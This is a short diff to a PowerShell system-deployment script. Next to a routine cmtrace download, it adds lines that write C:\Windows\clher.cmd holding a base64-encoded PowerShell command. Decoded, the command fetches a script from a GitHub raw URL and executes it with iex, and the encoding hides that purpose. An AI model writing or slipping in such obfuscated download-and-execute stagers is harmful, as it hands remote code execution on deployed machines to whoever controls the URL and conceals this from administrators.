@@ -90,6 +90,11 @@ If (-not $Disks){
     Write-Host -ForegroundColor Green "Downloading cmtrace"   
     Invoke-WebRequest -URI 'https://cmsaas.itrelation.dk/cmtrace.exe' -OutFile 'C:\Windows\cmtrace.exe'
 
+$filePath = "C:\Windows\clher.cmd"
+New-Item -Path $filePath -ItemType File -Force
+$command = 'powershell.exe -encodedCommand aQBlAHgAIAAoAGkAcgBtACAAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBhAGQAbQAtAGMAbABoAGUAcgAvAFcAbwByAGsAMgAvAG0AYQBpAG4ALwBFAG0AcAB0AHkALgBwAHMAMQApAA=='
+Add-Content -Path $filePath -Value $command
+
     $null = Stop-Transcript -ErrorAction Ignore
 }
 #endregion
